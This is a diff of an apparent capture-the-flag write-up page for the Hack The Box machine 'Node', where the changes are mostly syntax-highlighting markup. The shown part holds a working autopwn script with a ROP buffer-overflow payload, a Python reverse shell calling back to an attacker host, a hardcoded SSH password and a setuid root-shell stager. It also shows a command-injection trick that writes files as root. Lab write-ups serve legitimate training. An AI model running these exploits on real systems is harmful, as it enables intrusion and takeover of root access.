+</span></span><span class="line"><span class="cl"><span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span> <span class="s2">&#34;Number of tries: </span><span class="si">%d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="n">i</span>
+</span></span><span class="line"><span class="cl">    <span class="n">i</span> <span class="o">+=</span> <span class="mi">1</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ret</span> <span class="o">=</span> <span class="n">call</span><span class="p">([</span><span class="s2">&#34;./backup&#34;</span><span class="p">,</span> <span class="s2">&#34;qq&#34;</span><span class="p">,</span> <span class="s2">&#34;45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474&#34;</span><span class="p">,</span> <span class="n">buf</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="ow">not</span> <span class="n">ret</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">        <span class="k">break</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="nb">print</span> <span class="s2">&#34;Exploit failed&#34;</span></span></span></code></pre></div></p>
 
 <h2 id="6-writing-files-as-root">6. Writing files as root</h2>
 
 <p>One last interesting note. If we set umask to 0 we can create/write files as root but writable by tom too:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="go">tom@node:/$ umask 0 
-</span><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt &gt; /e\tc/test&#34;
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">tom@node:/$ ls -al /etc/test
-</span><span class="go">-rw-rw-rw-  1 root tom       0 Oct 15 12:48 test
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">tom@node:/$ umask 0 
+</span></span></span><span class="line"><span class="cl"><span class="go">tom@node:/$ /usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 &#34;/roo\t/roo\t.txt &gt; /e\tc/test&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">tom@node:/$ ls -al /etc/test
+</span></span></span><span class="line"><span class="cl"><span class="go">-rw-rw-rw-  1 root tom       0 Oct 15 12:48 test
+</span></span></span></code></pre></div></div></p>
 
 <p>Note that you cannot use this trick anymore to write cron jobs or ssh keys because nowadays -due to security mitigations- both require/check for stricter permissions.</p>
 
 <h1 id="autopwning-node">Autopwning Node</h1>
 
 <p>I wrote an autopwn script for Node (don&rsquo;t forget to set LHOST to the proper value):
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="ch">#!/usr/bin/env python2</span>
-<span class="c1"># -*- coding: utf-8 -*-</span>
-<span class="kn">import</span> <span class="nn">time</span>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
-
-<span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
-<span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.58&#34;</span>
-<span class="n">RPORT</span> <span class="o">=</span> <span class="mi">22</span>
-<span class="n">RPATH</span> <span class="o">=</span> <span class="s2">&#34;/dev/shm/.a/&#34;</span>
-<span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.14.107&#34;</span>
-<span class="n">LPORT</span> <span class="o">=</span> <span class="mi">60002</span>
-
-<span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
-<span class="k">else</span><span class="p">:</span>
-    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
-
-<span class="c1"># Write and compile rootshell.c</span>
-<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rootshell.c&#34;</span><span class="p">,</span> <span class="s2">&#34;wt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;#include &lt;stdio.h&gt;
-</span><span class="s2">#include &lt;stdlib.h&gt;
-</span><span class="s2">#include &lt;sys/types.h&gt;
-</span><span class="s2">#include &lt;unistd.h&gt;
-</span><span class="s2">
-</span><span class="s2">int main(void)
-</span><span class="s2">{
-</span><span class="s2">    setuid(0);
-</span><span class="s2">    system(&#34;/bin/sh&#34;);
-</span><span class="s2">    return 0;
-</span><span class="s2">}
-</span><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
-    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-
-<span class="k">if</span> <span class="n">call</span><span class="p">([</span><span class="s2">&#34;gcc&#34;</span><span class="p">,</span> <span class="s2">&#34;rootshell.c&#34;</span><span class="p">,</span> <span class="s2">&#34;-o&#34;</span><span class="p">,</span> <span class="s2">&#34;rootshell&#34;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Compilation of rootshell was successful&#34;</span><span class="p">)</span>
-
-<span class="c1"># Connect to ssh and download /usr/local/bin/backup</span>
-<span class="n">mark_shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">RPORT</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;mark&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;5AYRft73VtFpc84k&#39;</span><span class="p">)</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;User: &#34;</span><span class="o">+</span><span class="n">mark_shell</span><span class="p">[</span><span class="s1">&#39;whoami&#39;</span><span class="p">])</span>
-<span class="n">mark_shell</span><span class="o">.</span><span class="n">download_file</span><span class="p">(</span><span class="s2">&#34;/usr/local/bin/backup&#34;</span><span class="p">,</span><span class="n">local</span><span class="o">=</span><span class="s2">&#34;./backup&#34;</span><span class="p">)</span>
-
-<span class="c1"># Make payload</span>
-<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./backup&#39;</span><span class="p">)</span>
-<span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/tmp/.backup&#39;</span><span class="p">)))</span>
-<span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
-<span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
-
-<span class="c1"># Upload python reverse shell </span>
-<span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">mark_shell</span><span class="p">[</span><span class="s2">&#34;mkdir -p &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="p">])</span>
-<span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="s2">&#34;import os, pty, socket</span><span class="se">\n</span><span class="s2">&#34;</span> 
-<span class="s2">&#34;lhost = &#39;&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;lport =  &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;def main():</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    s.connect((lhost, lport))</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    os.dup2(s.fileno(),0)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    os.dup2(s.fileno(),1)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    os.dup2(s.fileno(),2)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    pty.spawn(&#39;/bin/bash&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    s.close()</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;if __name__ == &#39;__main__&#39;:</span><span class="se">\n</span><span class="s2">&#34;</span>
-<span class="s2">&#34;    main()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">remote</span><span class="o">=</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;shell.py&#34;</span><span class="p">)</span>
-
-<span class="c1"># Upload payload and rootshell</span>
-<span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">remote</span><span class="o">=</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;pld&#34;</span><span class="p">)</span>
-<span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_file</span><span class="p">(</span><span class="s2">&#34;rootshell&#34;</span><span class="p">,</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;rootshell&#34;</span><span class="p">)</span>
-
-<span class="c1"># Add python reverse shell task to mongodb </span>
-<span class="n">mongodb</span> <span class="o">=</span> <span class="n">mark_shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k&#34;</span><span class="p">)</span>
-<span class="n">mongodb</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">mongodb</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;db.tasks.insertOne({cmd:&#39;/usr/bin/python2 /dev/shm/.a/shell.py&#39;});&#34;</span><span class="p">)</span>
-
-<span class="c1"># Get root</span>
-<span class="n">tom_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cp &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;rootshell /tmp/.backup_</span><span class="si">%i</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;chmod +x /tmp/.backup_</span><span class="si">%i</span><span class="s2">&#34;</span><span class="p">)</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(cat &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;pld)&#34;</span><span class="p">)</span>
-<span class="n">tom_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -*- coding: utf-8 -*-</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">subprocess</span> <span class="kn">import</span> <span class="n">call</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.10.58&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPORT</span> <span class="o">=</span> <span class="mi">22</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPATH</span> <span class="o">=</span> <span class="s2">&#34;/dev/shm/.a/&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span> <span class="o">=</span> <span class="s2">&#34;10.10.14.107&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT</span> <span class="o">=</span> <span class="mi">60002</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Write and compile rootshell.c</span>
+</span></span><span class="line"><span class="cl"><span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;rootshell.c&#34;</span><span class="p">,</span> <span class="s2">&#34;wt&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&#34;&#34;&#34;#include &lt;stdio.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#include &lt;stdlib.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#include &lt;sys/types.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">#include &lt;unistd.h&gt;
+</span></span></span><span class="line"><span class="cl"><span class="s2">
+</span></span></span><span class="line"><span class="cl"><span class="s2">int main(void)
+</span></span></span><span class="line"><span class="cl"><span class="s2">{
+</span></span></span><span class="line"><span class="cl"><span class="s2">    setuid(0);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    system(&#34;/bin/sh&#34;);
+</span></span></span><span class="line"><span class="cl"><span class="s2">    return 0;
+</span></span></span><span class="line"><span class="cl"><span class="s2">}
+</span></span></span><span class="line"><span class="cl"><span class="s2">&#34;&#34;&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">f</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">call</span><span class="p">([</span><span class="s2">&#34;gcc&#34;</span><span class="p">,</span> <span class="s2">&#34;rootshell.c&#34;</span><span class="p">,</span> <span class="s2">&#34;-o&#34;</span><span class="p">,</span> <span class="s2">&#34;rootshell&#34;</span><span class="p">])</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;Compilation of rootshell was successful&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Connect to ssh and download /usr/local/bin/backup</span>
+</span></span><span class="line"><span class="cl"><span class="n">mark_shell</span> <span class="o">=</span> <span class="n">ssh</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="n">RHOST</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="n">RPORT</span><span class="p">,</span> <span class="n">user</span><span class="o">=</span><span class="s1">&#39;mark&#39;</span><span class="p">,</span> <span class="n">password</span><span class="o">=</span><span class="s1">&#39;5AYRft73VtFpc84k&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s2">&#34;User: &#34;</span><span class="o">+</span><span class="n">mark_shell</span><span class="p">[</span><span class="s1">&#39;whoami&#39;</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">mark_shell</span><span class="o">.</span><span class="n">download_file</span><span class="p">(</span><span class="s2">&#34;/usr/local/bin/backup&#34;</span><span class="p">,</span><span class="n">local</span><span class="o">=</span><span class="s2">&#34;./backup&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Make payload</span>
+</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./backup&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span> <span class="o">=</span> <span class="n">ROP</span><span class="p">(</span><span class="n">elf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="nb">next</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;/tmp/.backup&#39;</span><span class="p">)))</span>
+</span></span><span class="line"><span class="cl"><span class="n">rop</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">rop</span><span class="o">.</span><span class="n">dump</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s2">&#34;A&#34;</span><span class="o">*</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">rop</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Upload python reverse shell </span>
+</span></span><span class="line"><span class="cl"><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="n">mark_shell</span><span class="p">[</span><span class="s2">&#34;mkdir -p &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="p">])</span>
+</span></span><span class="line"><span class="cl"><span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="s2">&#34;import os, pty, socket</span><span class="se">\n</span><span class="s2">&#34;</span> 
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;lhost = &#39;&#34;</span> <span class="o">+</span> <span class="n">LHOST</span> <span class="o">+</span> <span class="s2">&#34;&#39;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;lport =  &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;def main():</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    s.connect((lhost, lport))</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    os.dup2(s.fileno(),0)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    os.dup2(s.fileno(),1)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    os.dup2(s.fileno(),2)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    pty.spawn(&#39;/bin/bash&#39;)</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    s.close()</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;if __name__ == &#39;__main__&#39;:</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="s2">&#34;    main()</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">,</span> <span class="n">remote</span><span class="o">=</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;shell.py&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Upload payload and rootshell</span>
+</span></span><span class="line"><span class="cl"><span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_data</span><span class="p">(</span><span class="n">payload</span><span class="p">,</span><span class="n">remote</span><span class="o">=</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;pld&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">mark_shell</span><span class="o">.</span><span class="n">upload_file</span><span class="p">(</span><span class="s2">&#34;rootshell&#34;</span><span class="p">,</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;rootshell&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Add python reverse shell task to mongodb </span>
+</span></span><span class="line"><span class="cl"><span class="n">mongodb</span> <span class="o">=</span> <span class="n">mark_shell</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="s2">&#34;mongo localhost:27017/scheduler -u mark -p 5AYRft73VtFpc84k&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">mongodb</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">mongodb</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;db.tasks.insertOne({cmd:&#39;/usr/bin/python2 /dev/shm/.a/shell.py&#39;});&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Get root</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">clean</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;cp &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;rootshell /tmp/.backup_</span><span class="si">%i</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;chmod +x /tmp/.backup_</span><span class="si">%i</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&#34;/usr/local/bin/backup qq 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 $(cat &#34;</span><span class="o">+</span><span class="n">RPATH</span><span class="o">+</span><span class="s2">&#34;pld)&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">tom_shell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span></span></span></code></pre></div></p>
 
 <p>You can find my scripts here: <a href="https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Node" target="_blank">https://github.com/Alamot/code-snippets/tree/master/hacking/HTB/Node</a></p>
 
@@ -995,17 +995,89 @@ if (language) {
            
            
            
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
-      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">19 Sep 2016</time>
-      <time lang="el">19 Σεπ 2016</time>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
     </footer>
   </a>
 </article>
@@ -1082,6 +1154,210 @@ if (language) {
           
            
            
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
